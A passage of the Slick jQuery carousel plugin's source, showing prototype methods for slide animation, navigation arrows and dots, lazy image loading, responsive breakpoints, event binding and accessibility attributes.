			a(c).attr("data-slick-index", b)
		}), e.$slidesCache = e.$slides, e.reinit()
	}, b.prototype.animateHeight = function() {
		var a = this;
		if (1 === a.options.slidesToShow && a.options.adaptiveHeight === !0 && a.options.vertical === !1) {
			var b = a.$slides.eq(a.currentSlide).outerHeight(!0);
			a.$list.animate({
				height: b
			}, a.options.speed)
		}
	}, b.prototype.animateSlide = function(b, c) {
		var d = {},
			e = this;
		e.animateHeight(), e.options.rtl === !0 && e.options.vertical === !1 && (b = -b), e.transformsEnabled === !1 ? e.options.vertical === !1 ? e.$slideTrack.animate({
			left: b
		}, e.options.speed, e.options.easing, c) : e.$slideTrack.animate({
			top: b
		}, e.options.speed, e.options.easing, c) : e.cssTransitions === !1 ? (e.options.rtl === !0 && (e.currentLeft = -e.currentLeft), a({
			animStart: e.currentLeft
		}).animate({
			animStart: b
		}, {
			duration: e.options.speed,
			easing: e.options.easing,
			step: function(a) {
				a = Math.ceil(a), e.options.vertical === !1 ? (d[e.animType] = "translate(" + a + "px, 0px)", e.$slideTrack.css(d)) : (d[e.animType] = "translate(0px," + a + "px)", e.$slideTrack.css(d))
			},
			complete: function() {
				c && c.call()
			}
		})) : (e.applyTransition(), b = Math.ceil(b), e.options.vertical === !1 ? d[e.animType] = "translate3d(" + b + "px, 0px, 0px)" : d[e.animType] = "translate3d(0px," + b + "px, 0px)", e.$slideTrack.css(d), c && setTimeout(function() {
			e.disableTransition(), c.call()
		}, e.options.speed))
	}, b.prototype.getNavTarget = function() {
		var b = this,
			c = b.options.asNavFor;
		return c && null !== c && (c = a(c).not(b.$slider)), c
	}, b.prototype.asNavFor = function(b) {
		var c = this,
			d = c.getNavTarget();
		null !== d && "object" == typeof d && d.each(function() {
			var c = a(this).slick("getSlick");
			c.unslicked || c.slideHandler(b, !0)
		})
	}, b.prototype.applyTransition = function(a) {
		var b = this,
			c = {};
		b.options.fade === !1 ? c[b.transitionType] = b.transformType + " " + b.options.speed + "ms " + b.options.cssEase : c[b.transitionType] = "opacity " + b.options.speed + "ms " + b.options.cssEase, b.options.fade === !1 ? b.$slideTrack.css(c) : b.$slides.eq(a).css(c)
	}, b.prototype.autoPlay = function() {
		var a = this;
		a.autoPlayClear(), a.slideCount > a.options.slidesToShow && (a.autoPlayTimer = setInterval(a.autoPlayIterator, a.options.autoplaySpeed))
	}, b.prototype.autoPlayClear = function() {
		var a = this;
		a.autoPlayTimer && clearInterval(a.autoPlayTimer)
	}, b.prototype.autoPlayIterator = function() {
		var a = this,
			b = a.currentSlide + a.options.slidesToScroll;
		a.paused || a.interrupted || a.focussed || (a.options.infinite === !1 && (1 === a.direction && a.currentSlide + 1 === a.slideCount - 1 ? a.direction = 0 : 0 === a.direction && (b = a.currentSlide - a.options.slidesToScroll, a.currentSlide - 1 === 0 && (a.direction = 1))), a.slideHandler(b))
	}, b.prototype.buildArrows = function() {
		var b = this;
		b.options.arrows === !0 && (b.$prevArrow = a(b.options.prevArrow).addClass("slick-arrow"), b.$nextArrow = a(b.options.nextArrow).addClass("slick-arrow"), b.slideCount > b.options.slidesToShow ? (b.$prevArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"), b.$nextArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"), b.htmlExpr.test(b.options.prevArrow) && b.$prevArrow.prependTo(b.options.appendArrows), b.htmlExpr.test(b.options.nextArrow) && b.$nextArrow.appendTo(b.options.appendArrows), b.options.infinite !== !0 && b.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true")) : b.$prevArrow.add(b.$nextArrow).addClass("slick-hidden").attr({
			"aria-disabled": "true",
			tabindex: "-1"
		}))
	}, b.prototype.buildDots = function() {
		var c, d, b = this;
		if (b.options.dots === !0 && b.slideCount > b.options.slidesToShow) {
			for (b.$slider.addClass("slick-dotted"), d = a("<ul />").addClass(b.options.dotsClass), c = 0; c <= b.getDotCount(); c += 1) d.append(a("<li />").append(b.options.customPaging.call(this, b, c)));
			b.$dots = d.appendTo(b.options.appendDots), b.$dots.find("li").first().addClass("slick-active").attr("aria-hidden", "false")
		}
	}, b.prototype.buildOut = function() {
		var b = this;
		b.$slides = b.$slider.children(b.options.slide + ":not(.slick-cloned)").addClass("slick-slide"), b.slideCount = b.$slides.length, b.$slides.each(function(b, c) {
			a(c).attr("data-slick-index", b).data("originalStyling", a(c).attr("style") || "")
		}), b.$slider.addClass("slick-slider"), b.$slideTrack = 0 === b.slideCount ? a('<div class="slick-track"/>').appendTo(b.$slider) : b.$slides.wrapAll('<div class="slick-track"/>').parent(), b.$list = b.$slideTrack.wrap('<div aria-live="polite" class="slick-list"/>').parent(), b.$slideTrack.css("opacity", 0), (b.options.centerMode === !0 || b.options.swipeToSlide === !0) && (b.options.slidesToScroll = 1), a("img[data-lazy]", b.$slider).not("[src]").addClass("slick-loading"), b.setupInfinite(), b.buildArrows(), b.buildDots(), b.updateDots(), b.setSlideClasses("number" == typeof b.currentSlide ? b.currentSlide : 0), b.options.draggable === !0 && b.$list.addClass("draggable")
	}, b.prototype.buildRows = function() {
		var b, c, d, e, f, g, h, a = this;
		if (e = document.createDocumentFragment(), g = a.$slider.children(), a.options.rows > 1) {
			for (h = a.options.slidesPerRow * a.options.rows, f = Math.ceil(g.length / h), b = 0; f > b; b++) {
				var i = document.createElement("div");
				for (c = 0; c < a.options.rows; c++) {
					var j = document.createElement("div");
					for (d = 0; d < a.options.slidesPerRow; d++) {
						var k = b * h + (c * a.options.slidesPerRow + d);
						g.get(k) && j.appendChild(g.get(k))
					}
					i.appendChild(j)
				}
				e.appendChild(i)
			}
			a.$slider.empty().append(e), a.$slider.children().children().children().css({
				width: 100 / a.options.slidesPerRow + "%",
				display: "inline-block"
			})
		}
	}, b.prototype.checkResponsive = function(b, c) {
		var e, f, g, d = this,
			h = !1,
			i = d.$slider.width(),
			j = window.innerWidth || a(window).width();
		if ("window" === d.respondTo ? g = j : "slider" === d.respondTo ? g = i : "min" === d.respondTo && (g = Math.min(j, i)), d.options.responsive && d.options.responsive.length && null !== d.options.responsive) {
			f = null;
			for (e in d.breakpoints) d.breakpoints.hasOwnProperty(e) && (d.originalSettings.mobileFirst === !1 ? g < d.breakpoints[e] && (f = d.breakpoints[e]) : g > d.breakpoints[e] && (f = d.breakpoints[e]));
			null !== f ? null !== d.activeBreakpoint ? (f !== d.activeBreakpoint || c) && (d.activeBreakpoint = f, "unslick" === d.breakpointSettings[f] ? d.unslick(f) : (d.options = a.extend({}, d.originalSettings, d.breakpointSettings[f]), b === !0 && (d.currentSlide = d.options.initialSlide), d.refresh(b)), h = f) : (d.activeBreakpoint = f, "unslick" === d.breakpointSettings[f] ? d.unslick(f) : (d.options = a.extend({}, d.originalSettings, d.breakpointSettings[f]), b === !0 && (d.currentSlide = d.options.initialSlide), d.refresh(b)), h = f) : null !== d.activeBreakpoint && (d.activeBreakpoint = null, d.options = d.originalSettings, b === !0 && (d.currentSlide = d.options.initialSlide), d.refresh(b), h = f), b || h === !1 || d.$slider.trigger("breakpoint", [d, h])
		}
	}, b.prototype.changeSlide = function(b, c) {
		var f, g, h, d = this,
			e = a(b.currentTarget);
		switch (e.is("a") && b.preventDefault(), e.is("li") || (e = e.closest("li")), h = d.slideCount % d.options.slidesToScroll !== 0, f = h ? 0 : (d.slideCount - d.currentSlide) % d.options.slidesToScroll, b.data.message) {
			case "previous":
				g = 0 === f ? d.options.slidesToScroll : d.options.slidesToShow - f, d.slideCount > d.options.slidesToShow && d.slideHandler(d.currentSlide - g, !1, c);
				break;
			case "next":
				g = 0 === f ? d.options.slidesToScroll : f, d.slideCount > d.options.slidesToShow && d.slideHandler(d.currentSlide + g, !1, c);
				break;
			case "index":
				var i = 0 === b.data.index ? 0 : b.data.index || e.index() * d.options.slidesToScroll;
				d.slideHandler(d.checkNavigable(i), !1, c), e.children().trigger("focus");
				break;
			default:
				return
		}
	}, b.prototype.checkNavigable = function(a) {
		var c, d, b = this;
		if (c = b.getNavigableIndexes(), d = 0, a > c[c.length - 1]) a = c[c.length - 1];
		else
			for (var e in c) {
				if (a < c[e]) {
					a = d;
					break
				}
				d = c[e]
			}
		return a
	}, b.prototype.cleanUpEvents = function() {
		var b = this;
		b.options.dots && null !== b.$dots && a("li", b.$dots).off("click.slick", b.changeSlide).off("mouseenter.slick", a.proxy(b.interrupt, b, !0)).off("mouseleave.slick", a.proxy(b.interrupt, b, !1)), b.$slider.off("focus.slick blur.slick"), b.options.arrows === !0 && b.slideCount > b.options.slidesToShow && (b.$prevArrow && b.$prevArrow.off("click.slick", b.changeSlide), b.$nextArrow && b.$nextArrow.off("click.slick", b.changeSlide)), b.$list.off("touchstart.slick mousedown.slick", b.swipeHandler), b.$list.off("touchmove.slick mousemove.slick", b.swipeHandler), b.$list.off("touchend.slick mouseup.slick", b.swipeHandler), b.$list.off("touchcancel.slick mouseleave.slick", b.swipeHandler), b.$list.off("click.slick", b.clickHandler), a(document).off(b.visibilityChange, b.visibility), b.cleanUpSlideEvents(), b.options.accessibility === !0 && b.$list.off("keydown.slick", b.keyHandler), b.options.focusOnSelect === !0 && a(b.$slideTrack).children().off("click.slick", b.selectHandler), a(window).off("orientationchange.slick.slick-" + b.instanceUid, b.orientationChange), a(window).off("resize.slick.slick-" + b.instanceUid, b.resize), a("[draggable!=true]", b.$slideTrack).off("dragstart", b.preventDefault), a(window).off("load.slick.slick-" + b.instanceUid, b.setPosition), a(document).off("ready.slick.slick-" + b.instanceUid, b.setPosition)
	}, b.prototype.cleanUpSlideEvents = function() {
		var b = this;
		b.$list.off("mouseenter.slick", a.proxy(b.interrupt, b, !0)), b.$list.off("mouseleave.slick", a.proxy(b.interrupt, b, !1))
	}, b.prototype.cleanUpRows = function() {
		var b, a = this;
		a.options.rows > 1 && (b = a.$slides.children().children(), b.removeAttr("style"), a.$slider.empty().append(b))
	}, b.prototype.clickHandler = function(a) {
		var b = this;
		b.shouldClick === !1 && (a.stopImmediatePropagation(), a.stopPropagation(), a.preventDefault())
	}, b.prototype.destroy = function(b) {
		var c = this;
		c.autoPlayClear(), c.touchObject = {}, c.cleanUpEvents(), a(".slick-cloned", c.$slider).detach(), c.$dots && c.$dots.remove(), c.$prevArrow && c.$prevArrow.length && (c.$prevArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""), c.htmlExpr.test(c.options.prevArrow) && c.$prevArrow.remove()), c.$nextArrow && c.$nextArrow.length && (c.$nextArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""), c.htmlExpr.test(c.options.nextArrow) && c.$nextArrow.remove()), c.$slides && (c.$slides.removeClass("slick-slide slick-active slick-center slick-visible slick-current").removeAttr("aria-hidden").removeAttr("data-slick-index").each(function() {
			a(this).attr("style", a(this).data("originalStyling"))
		}), c.$slideTrack.children(this.options.slide).detach(), c.$slideTrack.detach(), c.$list.detach(), c.$slider.append(c.$slides)), c.cleanUpRows(), c.$slider.removeClass("slick-slider"), c.$slider.removeClass("slick-initialized"), c.$slider.removeClass("slick-dotted"), c.unslicked = !0, b || c.$slider.trigger("destroy", [c])
	}, b.prototype.disableTransition = function(a) {
		var b = this,
			c = {};
		c[b.transitionType] = "", b.options.fade === !1 ? b.$slideTrack.css(c) : b.$slides.eq(a).css(c)
	}, b.prototype.fadeSlide = function(a, b) {
		var c = this;
		c.cssTransitions === !1 ? (c.$slides.eq(a).css({
			zIndex: c.options.zIndex
		}), c.$slides.eq(a).animate({
			opacity: 1
		}, c.options.speed, c.options.easing, b)) : (c.applyTransition(a), c.$slides.eq(a).css({
			opacity: 1,
			zIndex: c.options.zIndex
		}), b && setTimeout(function() {
			c.disableTransition(a), b.call()
		}, c.options.speed))
	}, b.prototype.fadeSlideOut = function(a) {
		var b = this;
		b.cssTransitions === !1 ? b.$slides.eq(a).animate({
			opacity: 0,
			zIndex: b.options.zIndex - 2
		}, b.options.speed, b.options.easing) : (b.applyTransition(a), b.$slides.eq(a).css({
			opacity: 0,
			zIndex: b.options.zIndex - 2
		}))
	}, b.prototype.filterSlides = b.prototype.slickFilter = function(a) {
		var b = this;
		null !== a && (b.$slidesCache = b.$slides, b.unload(), b.$slideTrack.children(this.options.slide).detach(), b.$slidesCache.filter(a).appendTo(b.$slideTrack), b.reinit())
	}, b.prototype.focusHandler = function() {
		var b = this;
		b.$slider.off("focus.slick blur.slick").on("focus.slick blur.slick", "*:not(.slick-arrow)", function(c) {
			c.stopImmediatePropagation();
			var d = a(this);
			setTimeout(function() {
				b.options.pauseOnFocus && (b.focussed = d.is(":focus"), b.autoPlay())
			}, 0)
		})
	}, b.prototype.getCurrent = b.prototype.slickCurrentSlide = function() {
		var a = this;
		return a.currentSlide
	}, b.prototype.getDotCount = function() {
		var a = this,
			b = 0,
			c = 0,
			d = 0;
		if (a.options.infinite === !0)
			for (; b < a.slideCount;) ++d, b = c + a.options.slidesToScroll, c += a.options.slidesToScroll <= a.options.slidesToShow ? a.options.slidesToScroll : a.options.slidesToShow;
		else if (a.options.centerMode === !0) d = a.slideCount;
		else if (a.options.asNavFor)
			for (; b < a.slideCount;) ++d, b = c + a.options.slidesToScroll, c += a.options.slidesToScroll <= a.options.slidesToShow ? a.options.slidesToScroll : a.options.slidesToShow;
		else d = 1 + Math.ceil((a.slideCount - a.options.slidesToShow) / a.options.slidesToScroll);
		return d - 1
	}, b.prototype.getLeft = function(a) {
		var c, d, f, b = this,
			e = 0;
		return b.slideOffset = 0, d = b.$slides.first().outerHeight(!0), b.options.infinite === !0 ? (b.slideCount > b.options.slidesToShow && (b.slideOffset = b.slideWidth * b.options.slidesToShow * -1, e = d * b.options.slidesToShow * -1), b.slideCount % b.options.slidesToScroll !== 0 && a + b.options.slidesToScroll > b.slideCount && b.slideCount > b.options.slidesToShow && (a > b.slideCount ? (b.slideOffset = (b.options.slidesToShow - (a - b.slideCount)) * b.slideWidth * -1, e = (b.options.slidesToShow - (a - b.slideCount)) * d * -1) : (b.slideOffset = b.slideCount % b.options.slidesToScroll * b.slideWidth * -1, e = b.slideCount % b.options.slidesToScroll * d * -1))) : a + b.options.slidesToShow > b.slideCount && (b.slideOffset = (a + b.options.slidesToShow - b.slideCount) * b.slideWidth, e = (a + b.options.slidesToShow - b.slideCount) * d), b.slideCount <= b.options.slidesToShow && (b.slideOffset = 0, e = 0), b.options.centerMode === !0 && b.options.infinite === !0 ? b.slideOffset += b.slideWidth * Math.floor(b.options.slidesToShow / 2) - b.slideWidth : b.options.centerMode === !0 && (b.slideOffset = 0, b.slideOffset += b.slideWidth * Math.floor(b.options.slidesToShow / 2)), c = b.options.vertical === !1 ? a * b.slideWidth * -1 + b.slideOffset : a * d * -1 + e, b.options.variableWidth === !0 && (f = b.slideCount <= b.options.slidesToShow || b.options.infinite === !1 ? b.$slideTrack.children(".slick-slide").eq(a) : b.$slideTrack.children(".slick-slide").eq(a + b.options.slidesToShow), c = b.options.rtl === !0 ? f[0] ? -1 * (b.$slideTrack.width() - f[0].offsetLeft - f.width()) : 0 : f[0] ? -1 * f[0].offsetLeft : 0, b.options.centerMode === !0 && (f = b.slideCount <= b.options.slidesToShow || b.options.infinite === !1 ? b.$slideTrack.children(".slick-slide").eq(a) : b.$slideTrack.children(".slick-slide").eq(a + b.options.slidesToShow + 1), c = b.options.rtl === !0 ? f[0] ? -1 * (b.$slideTrack.width() - f[0].offsetLeft - f.width()) : 0 : f[0] ? -1 * f[0].offsetLeft : 0, c += (b.$list.width() - f.outerWidth()) / 2)), c
	}, b.prototype.getOption = b.prototype.slickGetOption = function(a) {
		var b = this;
		return b.options[a]
	}, b.prototype.getNavigableIndexes = function() {
		var e, a = this,
			b = 0,
			c = 0,
			d = [];
		for (a.options.infinite === !1 ? e = a.slideCount : (b = -1 * a.options.slidesToScroll, c = -1 * a.options.slidesToScroll, e = 2 * a.slideCount); e > b;) d.push(b), b = c + a.options.slidesToScroll, c += a.options.slidesToScroll <= a.options.slidesToShow ? a.options.slidesToScroll : a.options.slidesToShow;
		return d
	}, b.prototype.getSlick = function() {
		return this
	}, b.prototype.getSlideCount = function() {
		var c, d, e, b = this;
		return e = b.options.centerMode === !0 ? b.slideWidth * Math.floor(b.options.slidesToShow / 2) : 0, b.options.swipeToSlide === !0 ? (b.$slideTrack.find(".slick-slide").each(function(c, f) {
			return f.offsetLeft - e + a(f).outerWidth() / 2 > -1 * b.swipeLeft ? (d = f, !1) : void 0
		}), c = Math.abs(a(d).attr("data-slick-index") - b.currentSlide) || 1) : b.options.slidesToScroll
	}, b.prototype.goTo = b.prototype.slickGoTo = function(a, b) {
		var c = this;
		c.changeSlide({
			data: {
				message: "index",
				index: parseInt(a)
			}
		}, b)
	}, b.prototype.init = function(b) {
		var c = this;
		a(c.$slider).hasClass("slick-initialized") || (a(c.$slider).addClass("slick-initialized"), c.buildRows(), c.buildOut(), c.setProps(), c.startLoad(), c.loadSlider(), c.initializeEvents(), c.updateArrows(), c.updateDots(), c.checkResponsive(!0), c.focusHandler()), b && c.$slider.trigger("init", [c]), c.options.accessibility === !0 && c.initADA(), c.options.autoplay && (c.paused = !1, c.autoPlay())
	}, b.prototype.initADA = function() {
		var b = this;
		b.$slides.add(b.$slideTrack.find(".slick-cloned")).attr({
			"aria-hidden": "true",
			tabindex: "-1"
		}).find("a, input, button, select").attr({
			tabindex: "-1"
		}), b.$slideTrack.attr("role", "listbox"), b.$slides.not(b.$slideTrack.find(".slick-cloned")).each(function(c) {
			a(this).attr({
				role: "option",
				"aria-describedby": "slick-slide" + b.instanceUid + c
			})
		}), null !== b.$dots && b.$dots.attr("role", "tablist").find("li").each(function(c) {
			a(this).attr({
				role: "presentation",
				"aria-selected": "false",
				"aria-controls": "navigation" + b.instanceUid + c,
				id: "slick-slide" + b.instanceUid + c
			})
		}).first().attr("aria-selected", "true").end().find("button").attr("role", "button").end().closest("div").attr("role", "toolbar"), b.activateADA()
	}, b.prototype.initArrowEvents = function() {
		var a = this;
		a.options.arrows === !0 && a.slideCount > a.options.slidesToShow && (a.$prevArrow.off("click.slick").on("click.slick", {
			message: "previous"
		}, a.changeSlide), a.$nextArrow.off("click.slick").on("click.slick", {
			message: "next"
		}, a.changeSlide))
	}, b.prototype.initDotEvents = function() {
		var b = this;
		b.options.dots === !0 && b.slideCount > b.options.slidesToShow && a("li", b.$dots).on("click.slick", {
			message: "index"
		}, b.changeSlide), b.options.dots === !0 && b.options.pauseOnDotsHover === !0 && a("li", b.$dots).on("mouseenter.slick", a.proxy(b.interrupt, b, !0)).on("mouseleave.slick", a.proxy(b.interrupt, b, !1))
	}, b.prototype.initSlideEvents = function() {
		var b = this;
		b.options.pauseOnHover && (b.$list.on("mouseenter.slick", a.proxy(b.interrupt, b, !0)), b.$list.on("mouseleave.slick", a.proxy(b.interrupt, b, !1)))
	}, b.prototype.initializeEvents = function() {
		var b = this;
		b.initArrowEvents(), b.initDotEvents(), b.initSlideEvents(), b.$list.on("touchstart.slick mousedown.slick", {
			action: "start"
		}, b.swipeHandler), b.$list.on("touchmove.slick mousemove.slick", {
			action: "move"
		}, b.swipeHandler), b.$list.on("touchend.slick mouseup.slick", {
			action: "end"
		}, b.swipeHandler), b.$list.on("touchcancel.slick mouseleave.slick", {
			action: "end"
		}, b.swipeHandler), b.$list.on("click.slick", b.clickHandler), a(document).on(b.visibilityChange, a.proxy(b.visibility, b)), b.options.accessibility === !0 && b.$list.on("keydown.slick", b.keyHandler), b.options.focusOnSelect === !0 && a(b.$slideTrack).children().on("click.slick", b.selectHandler), a(window).on("orientationchange.slick.slick-" + b.instanceUid, a.proxy(b.orientationChange, b)), a(window).on("resize.slick.slick-" + b.instanceUid, a.proxy(b.resize, b)), a("[draggable!=true]", b.$slideTrack).on("dragstart", b.preventDefault), a(window).on("load.slick.slick-" + b.instanceUid, b.setPosition), a(document).on("ready.slick.slick-" + b.instanceUid, b.setPosition)
	}, b.prototype.initUI = function() {
		var a = this;
		a.options.arrows === !0 && a.slideCount > a.options.slidesToShow && (a.$prevArrow.show(), a.$nextArrow.show()), a.options.dots === !0 && a.slideCount > a.options.slidesToShow && a.$dots.show()
	}, b.prototype.keyHandler = function(a) {
		var b = this;
		a.target.tagName.match("TEXTAREA|INPUT|SELECT") || (37 === a.keyCode && b.options.accessibility === !0 ? b.changeSlide({
			data: {
				message: b.options.rtl === !0 ? "next" : "previous"
			}
		}) : 39 === a.keyCode && b.options.accessibility === !0 && b.changeSlide({
			data: {
				message: b.options.rtl === !0 ? "previous" : "next"
			}
		}))
	}, b.prototype.lazyLoad = function() {
		function g(c) {
			a("img[data-lazy]", c).each(function() {
				var c = a(this),
					d = a(this).attr("data-lazy"),
					e = document.createElement("img");
				e.onload = function() {
					c.animate({
						opacity: 0
					}, 100, function() {
						c.attr("src", d).animate({
							opacity: 1
						}, 200, function() {
							c.removeAttr("data-lazy").removeClass("slick-loading")
						}), b.$slider.trigger("lazyLoaded", [b, c, d])
					})
				}, e.onerror = function() {
					c.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"), b.$slider.trigger("lazyLoadError", [b, c, d])
				}, e.src = d
			})
		}
		var c, d, e, f, b = this;
		b.options.centerMode === !0 ? b.options.infinite === !0 ? (e = b.currentSlide + (b.options.slidesToShow / 2 + 1), f = e + b.options.slidesToShow + 2) : (e = Math.max(0, b.currentSlide - (b.options.slidesToShow / 2 + 1)), f = 2 + (b.options.slidesToShow / 2 + 1) + b.currentSlide) : (e = b.options.infinite ? b.options.slidesToShow + b.currentSlide : b.currentSlide, f = Math.ceil(e + b.options.slidesToShow), b.options.fade === !0 && (e > 0 && e--, f <= b.slideCount && f++)), c = b.$slider.find(".slick-slide").slice(e, f), g(c), b.slideCount <= b.options.slidesToShow ? (d = b.$slider.find(".slick-slide"), g(d)) : b.currentSlide >= b.slideCount - b.options.slidesToShow ? (d = b.$slider.find(".slick-cloned").slice(0, b.options.slidesToShow), g(d)) : 0 === b.currentSlide && (d = b.$slider.find(".slick-cloned").slice(-1 * b.options.slidesToShow), g(d))
	}, b.prototype.loadSlider = function() {
		var a = this;
		a.setPosition(), a.$slideTrack.css({
			opacity: 1
		}), a.$slider.removeClass("slick-loading"), a.initUI(), "progressive" === a.options.lazyLoad && a.progressiveLazyLoad()
	}, b.prototype.next = b.prototype.slickNext = function() {
		var a = this;
		a.changeSlide({
			data: {
				message: "next"
			}
		})
	}, b.prototype.orientationChange = function() {
		var a = this;
		a.checkResponsive(), a.setPosition()
	}, b.prototype.pause = b.prototype.slickPause = function() {
		var a = this;
		a.autoPlayClear(), a.paused = !0
	}, b.prototype.play = b.prototype.slickPlay = function() {
		var a = this;
		a.autoPlay(), a.options.autoplay = !0, a.paused = !1, a.focussed = !1, a.interrupted = !1
	}, b.prototype.postSlide = function(a) {
		var b = this;
		b.unslicked || (b.$slider.trigger("afterChange", [b, a]), b.animating = !1, b.setPosition(), b.swipeLeft = null, b.options.autoplay && b.autoPlay(), b.options.accessibility === !0 && b.initADA())
	}, b.prototype.prev = b.prototype.slickPrev = function() {
		var a = this;
		a.changeSlide({
			data: {
				message: "previous"
			}
		})
	}, b.prototype.preventDefault = function(a) {
		a.preventDefault()
	}, b.prototype.progressiveLazyLoad = function(b) {
		b = b || 1;
		var e, f, g, c = this,
			d = a("img[data-lazy]", c.$slider);
		d.length ? (e = d.first(), f = e.attr("data-lazy"), g = document.createElement("img"), g.onload = function() {
			e.attr("src", f).removeAttr("data-lazy").removeClass("slick-loading"), c.options.adaptiveHeight === !0 && c.setPosition(), c.$slider.trigger("lazyLoaded", [c, e, f]), c.progressiveLazyLoad()
		}, g.onerror = function() {
			3 > b ? setTimeout(function() {
				c.progressiveLazyLoad(b + 1)
			}, 500) : (e.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"), c.$slider.trigger("lazyLoadError", [c, e, f]), c.progressiveLazyLoad())
		}, g.src = f) : c.$slider.trigger("allImagesLoaded", [c])
	}, b.prototype.refresh = function(b) {
		var d, e, c = this;
		e = c.slideCount - c.options.slidesToShow, !c.options.infinite && c.currentSlide > e && (c.currentSlide = e), c.slideCount <= c.options.slidesToShow && (c.currentSlide = 0), d = c.currentSlide, c.destroy(!0), a.extend(c, c.initials, {
			currentSlide: d
		}), c.init(), b || c.changeSlide({
			data: {
				message: "index",
				index: d
			}
		}, !1)
	}, b.prototype.registerBreakpoints = function() {
		var c, d, e, b = this,
			f = b.options.responsive || null;
		if ("array" === a.type(f) && f.length) {
			b.respondTo = b.options.respondTo || "window";
			for (c in f)
				if (e = b.breakpoints.length - 1, d = f[c].breakpoint, f.hasOwnProperty(c)) {
					for (; e >= 0;) b.breakpoints[e] && b.breakpoints[e] === d && b.breakpoints.splice(e, 1), e--;
					b.breakpoints.push(d), b.breakpointSettings[d] = f[c].settings
				}
			b.breakpoints.sort(function(a, c) {
				return b.options.mobileFirst ? a - c : c - a
			})
		}
	}, b.prototype.reinit = function() {
		var b = this;
		b.$slides = b.$slideTrack.children(b.options.slide).addClass("slick-slide"), b.slideCount = b.$slides.length, b.currentSlide >= b.slideCount && 0 !== b.currentSlide && (b.currentSlide = b.currentSlide - b.options.slidesToScroll), b.slideCount <= b.options.slidesToShow && (b.currentSlide = 0), b.registerBreakpoints(), b.setProps(), b.setupInfinite(), b.buildArrows(), b.updateArrows(), b.initArrowEvents(), b.buildDots(), b.updateDots(), b.initDotEvents(), b.cleanUpSlideEvents(), b.initSlideEvents(), b.checkResponsive(!1, !0), b.options.focusOnSelect === !0 && a(b.$slideTrack).children().on("click.slick", b.selectHandler), b.setSlideClasses("number" == typeof b.currentSlide ? b.currentSlide : 0), b.setPosition(), b.focusHandler(), b.paused = !b.options.autoplay, b.autoPlay(), b.$slider.trigger("reInit", [b])
	}, b.prototype.resize = function() {
		var b = this;
		a(window).width() !== b.windowWidth && (clearTimeout(b.windowDelay), b.windowDelay = window.setTimeout(function() {
			b.windowWidth = a(window).width(), b.checkResponsive(), b.unslicked || b.setPosition()
		}, 50))
	}, b.prototype.removeSlide = b.prototype.slickRemove = function(a, b, c) {
		var d = this;
		return "boolean" == typeof a ? (b = a, a = b === !0 ? 0 : d.slideCount - 1) : a = b === !0 ? --a : a, d.slideCount < 1 || 0 > a || a > d.slideCount - 1 ? !1 : (d.unload(), c === !0 ? d.$slideTrack.children().remove() : d.$slideTrack.children(this.options.slide).eq(a).remove(), d.$slides = d.$slideTrack.children(this.options.slide), d.$slideTrack.children(this.options.slide).detach(), d.$slideTrack.append(d.$slides), d.$slidesCache = d.$slides, void d.reinit())
	}, b.prototype.setCSS = function(a) {
		var d, e, b = this,
			c = {};
		b.options.rtl === !0 && (a = -a), d = "left" == b.positionProp ? Math.ceil(a) + "px" : "0px", e = "top" == b.positionProp ? Math.ceil(a) + "px" : "0px", c[b.positionProp] = a, b.transformsEnabled === !1 ? b.$slideTrack.css(c) : (c = {}, b.cssTransitions === !1 ? (c[b.animType] = "translate(" + d + ", " + e + ")", b.$slideTrack.css(c)) : (c[b.animType] = "translate3d(" + d + ", " + e + ", 0px)", b.$slideTrack.css(c)))
	}, b.prototype.setDimensions = function() {
		var a = this;
		a.options.vertical === !1 ? a.options.centerMode === !0 && a.$list.css({
			padding: "0px " + a.options.centerPadding
		}) : (a.$list.height(a.$slides.first().outerHeight(!0) * a.options.slidesToShow), a.options.centerMode === !0 && a.$list.css({
			padding: a.options.centerPadding + " 0px"
		})), a.listWidth = a.$list.width(), a.listHeight = a.$list.height(), a.options.vertical === !1 && a.options.variableWidth === !1 ? (a.slideWidth = Math.ceil(a.listWidth / a.options.slidesToShow), a.$slideTrack.width(Math.ceil(a.slideWidth * a.$slideTrack.children(".slick-slide").length))) : a.options.variableWidth === !0 ? a.$slideTrack.width(5e3 * a.slideCount) : (a.slideWidth = Math.ceil(a.listWidth), a.$slideTrack.height(Math.ceil(a.$slides.first().outerHeight(!0) * a.$slideTrack.children(".slick-slide").length)));
		var b = a.$slides.first().outerWidth(!0) - a.$slides.first().width();
		a.options.variableWidth === !1 && a.$slideTrack.children(".slick-slide").width(a.slideWidth - b)
	}, b.prototype.setFade = function() {
		var c, b = this;
		b.$slides.each(function(d, e) {
			c = b.slideWidth * d * -1, b.options.rtl === !0 ? a(e).css({
				position: "relative",
				right: c,
				top: 0,
				zIndex: b.options.zIndex - 2,
				opacity: 0
			}) : a(e).css({
				position: "relative",
				left: c,
				top: 0,
				zIndex: b.options.zIndex - 2,
				opacity: 0
			})
		}), b.$slides.eq(b.currentSlide).css({
			zIndex: b.options.zIndex - 1,
			opacity: 1
		})
	}, b.prototype.setHeight = function() {
		var a = this;
		if (1 === a.options.slidesToShow && a.options.adaptiveHeight === !0 && a.options.vertical === !1) {
			var b = a.$slides.eq(a.currentSlide).outerHeight(!0);
			a.$list.css("height", b)
		}
	}, b.prototype.setOption = b.prototype.slickSetOption = function() {
		var c, d, e, f, h, b = this,
			g = !1;
		if ("object" === a.type(arguments[0]) ? (e = arguments[0], g = arguments[1], h = "multiple") : "string" === a.type(arguments[0]) && (e = arguments[0], f = arguments[1], g = arguments[2], "responsive" === arguments[0] && "array" === a.type(arguments[1]) ? h = "responsive" : "undefined" != typeof arguments[1] && (h = "single")), "single" === h) b.options[e] = f;
		else if ("multiple" === h) a.each(e, function(a, c) {
			b.options[a] = c
		});
		else if ("responsive" === h)
			for (d in f)
				if ("array" !== a.type(b.options.responsive)) b.options.responsive = [f[d]];
				else {
					for (c = b.options.responsive.length - 1; c >= 0;) b.options.responsive[c].breakpoint === f[d].breakpoint && b.options.responsive.splice(c, 1), c--;
					b.options.responsive.push(f[d])
				}
		g && (b.unload(), b.reinit())
	}, b.prototype.setPosition = function() {
		var a = this;
